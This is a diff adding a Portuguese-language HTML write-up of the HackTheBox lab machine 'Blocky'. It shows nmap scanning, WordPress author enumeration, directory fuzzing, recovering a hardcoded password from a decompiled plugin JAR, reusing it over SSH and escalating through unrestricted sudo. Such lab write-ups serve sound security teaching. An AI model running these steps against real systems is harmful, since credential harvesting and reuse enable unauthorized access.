@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>blocky.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Voltar
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/machines/blocky.html" class="active" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/machines/blocky.html" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Blocky</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Blocky hospeda um WordPress e um servidor de Minecraft. Um plugin Java exposto em <i>/plugins</i> traz uma <b>senha fixa no código</b>, reaproveitada pelo usuário <i>notch</i> no SSH, e esse usuário tem <b>sudo irrestrito</b>.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Fluxo do ataque</figcaption>
+            <svg viewBox="0 0 660 130" role="img" aria-label="Fluxo do ataque" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconhecimento</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploração - credencial no JAR</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Escalação - sudo</tspan></text></svg>
+         </figure>
+
+         <h2>Reconhecimento</h2>
+
+         <p>O Nmap mostra FTP, SSH, Apache e um <b>Minecraft 1.11.2</b> na 25565. O site redireciona para <i>blocky.htb</i>.</p>
+
+         <pre class="code-block"><code>nmap -Pn -n -sT --min-rate 1500 -p- &lt;IP&gt;
+nmap -Pn -n -sT -sV -sC -p21,22,80,25565 &lt;IP&gt;
+# 21 ftp, 22 OpenSSH 7.2p2, 80 Apache 2.4.18, 25565 Minecraft 1.11.2
+echo &quot;&lt;IP&gt; blocky.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+
+         <p>O site é um WordPress. A API REST lista os autores, e o único é <i>notch</i>. O fuzzing encontra o diretório <i>/plugins</i>, com dois arquivos JAR.</p>
+
+         <pre class="code-block"><code>curl -s http://blocky.htb/wp-json/wp/v2/users | jq -r &#x27;.[].slug&#x27;
+# notch
+ffuf -u http://blocky.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
+# phpmyadmin, plugins, wiki, wp-admin, ...</code></pre>
+
+         <h2>Exploração - credencial no JAR</h2>
+
+         <p>O <i>BlockyCore.jar</i> é o plugin feito pelo próprio dono do servidor. Decompilado, ele mostra as credenciais do banco escritas direto no código.</p>
+
+         <pre class="code-block"><code>wget http://blocky.htb/plugins/files/BlockyCore.jar
+unzip BlockyCore.jar -d core
+javap -c -constants -p core/com/myfirstplugin/BlockyCore.class | grep -A1 sql</code></pre>
+
+         <pre class="code-block"><code>public class BlockyCore {
+  public String sqlHost = &quot;localhost&quot;;
+  public String sqlUser = &quot;root&quot;;
+  public String sqlPass = &quot;&lt;senha&gt;&quot;;
+}</code></pre>
+
+         <p>A senha do root do MySQL funciona no SSH como <i>notch</i>, o autor do WordPress.</p>
+
+         <pre class="code-block"><code>ssh notch@&lt;IP&gt;
+cat ~/user.txt</code></pre>
+
+         <h2>Escalação - sudo</h2>
+
+         <p>O <i>notch</i> pode rodar qualquer comando como qualquer usuário via sudo, com a própria senha.</p>
+
+         <pre class="code-block"><code>sudo -l
+# (ALL : ALL) ALL
+sudo -i
+cat /root/root.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
